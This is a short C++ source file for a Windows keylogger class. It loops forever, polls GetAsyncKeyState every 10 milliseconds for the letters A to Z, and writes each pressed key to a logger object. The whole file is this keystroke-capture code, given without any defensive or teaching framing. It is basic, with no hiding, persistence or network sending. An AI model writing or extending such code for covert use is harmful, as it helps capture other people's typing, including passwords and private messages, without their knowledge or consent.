#include "KeyLogger.h"
#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

KeyLogger::KeyLogger(Logger* logger) {
	this->logger = logger;
}

void KeyLogger::StartLogging() {
	const short pressedState = (1 << 15) | 1;

	while (true) {
		Sleep(10);

		// Iterate through all virtual key codes 
		for (char i = 'A'; i <= 'Z'; i++) {
			if (GetAsyncKeyState(i) == pressedState) 
			{ 
				this->logger->Write(i);
			}
		}
	}
}